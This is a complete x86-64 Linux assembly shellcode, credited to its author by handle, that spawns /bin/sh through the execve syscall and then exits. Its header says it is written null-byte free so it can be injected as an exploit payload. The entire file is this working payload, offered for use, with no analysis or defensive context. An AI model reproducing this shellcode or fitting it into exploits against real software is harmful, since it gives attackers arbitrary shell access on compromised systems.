#execve ("/bin/sh"); exit (0);
#assembly linux 64
#for shellcode, nullbyte free
#by m0nad /at/ email.com
.text
 .global _start

_start:
  movq  $0x68732f6e69622f2f, %rdi
  shr   $0x8, %rdi
  pushq %rdi
  movq  %rsp, %rdi
  xorq  %rsi, %rsi
  xorq  %rdx, %rdx
  xorq  %rax, %rax
  mov   $0x3b, %al
  syscall

  xorq %rdi, %rdi
  xorq %rax, %rax
  mov  $0x3c, %al
  syscall


